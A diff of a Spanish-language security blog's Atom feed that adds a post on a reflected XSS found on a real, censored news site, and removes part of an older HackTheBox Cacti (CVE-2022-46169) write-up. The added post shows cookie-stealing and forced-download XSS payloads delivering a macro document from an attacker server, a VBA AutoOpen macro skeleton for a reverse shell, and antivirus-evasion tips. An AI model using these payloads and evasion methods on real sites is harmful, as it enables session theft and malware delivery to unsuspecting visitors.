@@ -1,5 +1,133 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" hreflang="en" /><updated>2023-06-27T20:34:08-06:00</updated><id>/feed.xml</id><title type="html">c4rta</title><subtitle>Soy Omar, un radioaficionado amante de la ciberseguridad
-</subtitle><author><name>Omar</name></author><entry><title type="html">HackTheBox Jupiter - SQLi a RCE, Movimiento lateral via Jupyter y YAML</title><link href="/blog/posts/2023-06-26-htb-jupiter/" rel="alternate" type="text/html" title="HackTheBox Jupiter - SQLi a RCE, Movimiento lateral via Jupyter y YAML" /><published>2023-06-26T00:00:00-06:00</published><updated>2023-06-27T16:13:14-06:00</updated><id>/blog/posts/htb-jupiter</id><content type="html" xml:base="/blog/posts/2023-06-26-htb-jupiter/">&lt;h2 id=&quot;enumeracion&quot;&gt;Enumeracion&lt;/h2&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" hreflang="en" /><updated>2023-06-28T14:49:18-06:00</updated><id>/feed.xml</id><title type="html">c4rta</title><subtitle>Soy Omar, un radioaficionado amante de la ciberseguridad
+</subtitle><author><name>Omar</name></author><entry><title type="html">Simple XSS reflejado en un entorno real</title><link href="/blog/posts/2023-06-28-client-side-xss/" rel="alternate" type="text/html" title="Simple XSS reflejado en un entorno real" /><published>2023-06-28T00:00:00-06:00</published><updated>2023-06-28T14:49:17-06:00</updated><id>/blog/posts/client-side-xss</id><content type="html" xml:base="/blog/posts/2023-06-28-client-side-xss/">&lt;p&gt;&lt;strong&gt;Este no es ningun writeup, pero te voy a mostrar como encontre de casualidad una vulnerabilidad &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;XSS reflejado&lt;/code&gt; en un sitio web real, cabe recalcar que la vulnerabilidad ya la reporte, y no estoy promoviendo explotar vulnerabilidades en entornos reales, y simplemente te voy a dar la idea de algo que podria hacer alguien con malas intenciones, que este no es el caso, y espero que el tuyo tampoco&lt;/strong&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;xss-reflejado&quot;&gt;XSS reflejado&lt;/h2&gt;
+
+&lt;p&gt;De acuerdo a port swigger se trata de:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Surge cuando una aplicación recibe datos en una solicitud HTTP e incluye esos datos en la respuesta inmediata de forma no segura&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Este es un tipo de XSS donde el codigo que inyectamos es interpretado por el servidor web para posteriormente mandarnos la respuesta de ese codigo a nuestro navegador web, es decir, que en un XSS reflejado el codigo malicioso se incluye en la respuesta del servidor y se refleja en la pagina web que ve el cliente.&lt;/p&gt;
+
+&lt;p&gt;En este tipo de XSS el codigo no reside en la aplicacion web como tal y no se encuentra del lado del servidor, y regularmente un atacante puede incrustar su payload malicioso en la URL generada y enviarselo a la victima, obvio se usa ingenieria social y phishing para que sea mas creible&lt;/p&gt;
+
+&lt;h2 id=&quot;identificando-el-xss&quot;&gt;Identificando el XSS&lt;/h2&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Evidentemente voy se censurar la URL&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;strong&gt;¿Como me di cuenta que era un XSS?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Fue muy random, originalmente yo solo queria buscar una noticia, entonces use su barra de busqueda para encontrar lo que queria, cuando busque por un termino me di cuenta de la forma tan peculiar de la URL y como se mostraban los datos en la pagina, mira:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/simple_xss/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vean como cuando se realiza una busqueda, te manda a la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/buscar/&lt;/code&gt; la cual tiene un parametro de consulta el cual es la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;q&lt;/code&gt;, como se ve en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?q=c4rta&lt;/code&gt;, asi que el parametro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;q&lt;/code&gt; es utilizado para especificar el termino que se quiere buscar, y del lado de la pagina web, el termino que busque se refleja en la pagina web&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/simple_xss/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Esto ya estaba curioso, asi que decidi mostrar el codigo fuente de la pagina cuando se realiza la busqueda, y por suerte encontre la funcion que realiza la busqueda&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/simple_xss/3_000.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Primero con:&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;searchString&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;searchtextsimple&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Lo que esta haciendo es crear una variable llamada &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;searchString&lt;/code&gt; la cual va a contener el valor del atributo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;value&lt;/code&gt; del elemento con el id &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;searchtextsimple&lt;/code&gt;, y ese elemento con el id es este:&lt;/p&gt;
+
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;searchtextsimple&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;q&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;form-control&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;placeholder=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Buscar&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;c4rta&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/input&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Despues en el JS tenemos que nuestro input el cual esta guardado en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;searchString&lt;/code&gt; se le concatena sin ningun tipo de procesamiento ni sanitizacion a la URL a tra vez del parametro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;q&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;https://&amp;lt;URL&amp;gt;/barebone/wf.template/config.default.master.withgroupcount?q=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;encodeURI&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;searchString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Y por ultimo carga la URL para mostrarla en la web:&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;.results-group.parent&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;load&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Entonces tenemos que nuestro input se guarda en al atributo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;value&lt;/code&gt; de  la etiqueta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;input&amp;gt;&lt;/code&gt; y despues se extrae y se concatena directamente en la URL para luego ser interpretado por el sitio web, la vulnerabilidad es obvia, al yo tener control total de lo que quiero buscar y este sera interpretado, entonces puedo probar por XSS a ver si interpreta codigo de JS, ahora le ingresare esto como input:&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Prueba XSS&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/script&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Y vean como si nos interpreta el JS y ya nos dimos cuenta que tenemos un XSS reflejado&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/simple_xss/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Y en la URL se incrusto el codigo de XSS&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/simple_xss/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Podria usar otro payload para obtener las cookies, y curiosamente este sitio web tiene un monton&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/script&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;center&gt;&lt;img src=&quot;/assets/img/simple_xss/6.png&quot; width=&quot;290px&quot; height=&quot;200px&quot; /&gt;&lt;/center&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Evidentemente censure todo por que sale mi cookie de sesion asi como otras muchas, y es posible que hayas pensado que este XSS una vez teniendo la cookie de sesion podria conducir a un CSRF/XSRF, y es correcto mientras sea vulnerable a ello. pero este vez vamos a ir mas alla, por que este XSS lo vamos combinar con malware, mas en concreto algo que se le conoce como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MalDoc&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;maldoc&quot;&gt;MalDoc&lt;/h2&gt;
+
+&lt;p&gt;MalDoc viene de Malicious Document, y lo que podria hacer ahora es crear una macro en VBS la cual vamos a incrustar en un docx, donde la macro se ejecutara automaticamente al abrirse el documento, y vamos a aprovechar el XSS para crear un payload que al entrar a la URL vulnerable a XSS, se descargue automaticamente el documento de una URL creada por el atacante, el payload es el siguiente:&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 
+    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;link&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createElement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;link&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;href&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;URL:8080/MalDoc.docx&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;link&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;download&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;MalDoc.docx&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;link&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;click&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/script&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Basicamente el escenario seria que nosotros como atacantes le mandemos a la victima la URL del sitio vulnerable con el payload, la victima abra la URL, se descargue automaticamente el docx, se redireccione al sitio original de la pagina vulnerable, la victima abra el documento que contiene una macro, la macro se ejecute y ejecuta un comando que podria ser una reverse shell&lt;/p&gt;
+
+&lt;p&gt;Esto pasaria si la victima abre el link con el payload:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/simple_xss/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vean como la URL tiene el payload, y el entrar al link, se descargar automaticamente el documento del sitio web del atacante, en este caso, es un servidor web que cree con python y que tiene mi IPv4.&lt;/p&gt;
+
+&lt;p&gt;Y entonces al abrirlo se deberia de ejecutar la macro con la reverse shell, pero ¿Como se crea la macro?, bueno, el msfvenom ya tiene modulos para crear un MalDoc y una macro maliciosa, pero estamos aprendiendo, hay que hacerlo manual, simplemente de voy a dar la idea, no lo voy a poner a prueba.&lt;/p&gt;
+
+&lt;p&gt;Podriamos crear un archivo VBS de esta manera:&lt;/p&gt;
+
+&lt;div class=&quot;language-vb highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;Sub&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;AutoOpen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;Comando_Ps&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;el tipico oneliner de powershell&quot;&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;Dim&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Shell&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;As&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;Object&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;Set&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Shell&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CreateObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Wscript.Shell&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;Shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Run&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Comando_Ps&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;End&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;Sub&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Basicamente lo que va a hacer es ejecutar un comando de powershell que se declare en la variable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Comando_Ps&lt;/code&gt; a tra vez de un objeto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Wscript.Shell&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Y ahora para incrustarla en el docuemento se puede hacer uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Microsoft Visual Basic for Applications&lt;/code&gt; y guardar el documento con la macro.&lt;/p&gt;
+
+&lt;p&gt;Y seguramente diras: “Eso no evade ningun antivirus, y el defender lo va a detectar”, y en efecto, asi que te dare unos tips&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Usa Invoke-Obfuscation&lt;/li&gt;
+  &lt;li&gt;Usa procesos VMI&lt;/li&gt;
+  &lt;li&gt;Usa StrRerverse() para agregar un poco mas de ofuscacion&lt;/li&gt;
+  &lt;li&gt;Usa WMI Win32_PingStatus para evadir sandboxes&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;(Estas tecnicas que acabe de mencionar, como lo de MalDoc con la macro y las tecnicas para evadir antivirus pienso dedicarles un post aparte)&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Recuerda que la vulnerabilidad ya esta reportada, y no estoy promoviendo la creacion de malware ni tampoco el explotar vulnerabilidades sin el permisos de otros, es meramente educativo e informativo.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Eso ha sido todo, gracias por leer ❤&lt;/p&gt;</content><author><name>c4rta</name></author><category term="posts" /><category term="XSS" /><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="/assets/img/simple_xss/waifu.gif" /><media:content medium="image" url="/assets/img/simple_xss/waifu.gif" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">HackTheBox Jupiter - SQLi a RCE, Movimiento lateral via Jupyter y YAML</title><link href="/blog/posts/2023-06-26-htb-jupiter/" rel="alternate" type="text/html" title="HackTheBox Jupiter - SQLi a RCE, Movimiento lateral via Jupyter y YAML" /><published>2023-06-26T00:00:00-06:00</published><updated>2023-06-27T16:13:14-06:00</updated><id>/blog/posts/htb-jupiter</id><content type="html" xml:base="/blog/posts/2023-06-26-htb-jupiter/">&lt;h2 id=&quot;enumeracion&quot;&gt;Enumeracion&lt;/h2&gt;
 
 &lt;p&gt;Iniciamos con un escaneo de nmap con:&lt;/p&gt;
 
@@ -2815,280 +2943,4 @@ http {
 
 &lt;p&gt;Joder, esto si es RCE  🚬&lt;/p&gt;
 
-&lt;p&gt;Eso ha sido todo, gracias por leer ❤&lt;/p&gt;</content><author><name>c4rta</name></author><category term="posts" /><category term="LFI" /><category term="log poisoning" /><category term="Insecure Deserialization" /><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="/assets/img/toxic/waifu.gif" /><media:content medium="image" url="/assets/img/toxic/waifu.gif" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">HackTheBox MonitorsTwo - Unauthenticated RCE &amp;amp; Docker Weak Permissions</title><link href="/blog/posts/2023-05-08-htb-monitorsTwo/" rel="alternate" type="text/html" title="HackTheBox MonitorsTwo - Unauthenticated RCE &amp;amp; Docker Weak Permissions" /><published>2023-05-08T00:00:00-06:00</published><updated>2023-05-31T19:37:58-06:00</updated><id>/blog/posts/htb-monitorsTwo</id><content type="html" xml:base="/blog/posts/2023-05-08-htb-monitorsTwo/">&lt;h2 id=&quot;enumeracion&quot;&gt;Enumeracion&lt;/h2&gt;
-
-&lt;p&gt;Iniciamos con un escaneo con el comando&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap -sS -n -Pn --open -p- 10.10.11.211&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Donde le indicamos que con:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;
-    &lt;p&gt;sS: haga un TCP SYN Scan el cual hace que el destino responda con un RST si el puerto esta cerrado, o con un SYN/ACK si esta abierto, esto con el fin de iniciar la conexion sin que termine&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;n: para que no haga resolucion DNS y tarde menos el escaneo&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Pn: para evitar el descubrimiento de hosts&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;open: para que solo muestre los puertos abiertos&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;-p-: para que escanee todo el rango de puertos&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Y nos reporto que hay varios puertos abiertos:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PORT   STATE SERVICE
-22/tcp open  ssh
-80/tcp open  http
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ahora escanearemos los puertos 22, 80 buscando la version y servicio y demas informacion:&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo nmap -sCV -p22,80 10.10.11.211&lt;/code&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
-|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
-|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
-80/tcp open  http    nginx 1.18.0 (Ubuntu)
-|_http-server-header: nginx/1.18.0 (Ubuntu)
-|_http-title: Login to Cacti
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 11.36 seconds
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;No tenemos muchas informacion relevante, mas que en el puerto 80, vemos que por el titulo HTTP nos dice que hay un login: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http-title: Login to Cacti&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Una vez en el sitio web podemos ver el login:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/monitorsTwo/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;(Les puedo adelantar que no es necesario hacer fuzzing de directorios ni otras cosas)&lt;/p&gt;
-
-&lt;h2 id=&quot;cve-2022-46169---command-injection&quot;&gt;CVE-2022-46169 - Command injection&lt;/h2&gt;
-
-&lt;p&gt;Abajo del apartado de inicio de sesion nos dice que esta usando la version 1.2.22 de Cacti, una busqueda rapida de lo que es Cacti, me arroja que es una aplicacion web dedicada al monitoreo de red, para detectar fallas y supervisar el trafico web.&lt;/p&gt;
-
-&lt;p&gt;Como tenemos una version, siempre es bueno buscar para ver si hay vulnerabilidades disponibles, podemos ver que existe la CVE &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CVE-2022-46169&lt;/code&gt; que es una Command injection con la que conseguiremos un RCE.&lt;/p&gt;
-
-&lt;p&gt;Al realizar una busqueda, tenemos que la vulnerabilidad reside en el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;remote_agent.php&lt;/code&gt; el cual podemos acceder sin autenticacion, pero si intentamos acceder a el desde el URL: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://10.10.11.211/remote_agent.php&lt;/code&gt;, nos saldra algo como esto:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/monitorsTwo/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Leyendo un poco mas de la vulnerabilidad, para que nos deje acceder, dedemos agregar el encabezado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;X-Forwarded-For&lt;/code&gt; con la direccion de localhost&lt;/p&gt;
-
-&lt;p&gt;Una vez que podamos acceder al recurso, en la funcion &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;poll_for_data()&lt;/code&gt; es donde existe el command injection:&lt;/p&gt;
-
